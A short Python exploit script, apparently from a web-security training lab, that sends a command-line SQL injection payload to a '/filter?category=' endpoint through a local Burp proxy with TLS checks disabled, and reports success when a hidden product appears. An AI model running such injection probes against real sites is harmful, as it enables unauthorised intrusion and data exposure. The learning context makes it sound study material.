import requests # allows HTTP requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # hides insecure warning in terminal

# set proxy setting; great way to debug why script does not work
#   whenever this script runs, it will pass through the Burp proxy
#       if I allow it in the Burp proxy to relay it back to the web server, it will do that
#   any response from the web server will be passed through the proxy again
#       and then through the web application
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def exploit_sqli(url, payload):
    uri = '/filter?category=' # taken from Burp Suite proxy intercept
    response = requests.get(url + uri + payload, verify=False, proxies=proxies)
    
    # check if vulnerability exploit was successful
    if "Cat Grin" in response.text: # Cat Grin is a known unreleased product found via manual SQL injection 
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        # pass URL and payload containing SQL injection
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        # throw readable error if URL and/or payload is incorrect
        print('[-] Usage: %s <url> <payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection failed!")

